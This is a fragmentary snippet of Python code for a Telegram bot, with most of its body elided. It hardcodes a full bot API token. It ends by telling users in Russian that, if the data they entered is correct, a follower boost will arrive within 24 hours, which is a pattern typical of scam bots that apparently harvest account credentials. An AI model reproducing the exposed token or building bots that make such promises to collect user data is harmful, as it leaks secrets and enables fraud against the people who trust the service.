...
ID = '@Squate_Dev'
bot = telebot.TeleBot("7498963760:AAHbSnXb1w42FFhzS43ZiVWDZuuTLPnatFU")
try:
...
'''
	...
	time.sleep(1)
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, то ожидайте накрутку на ваш аккаунт в течении 24 часов!')
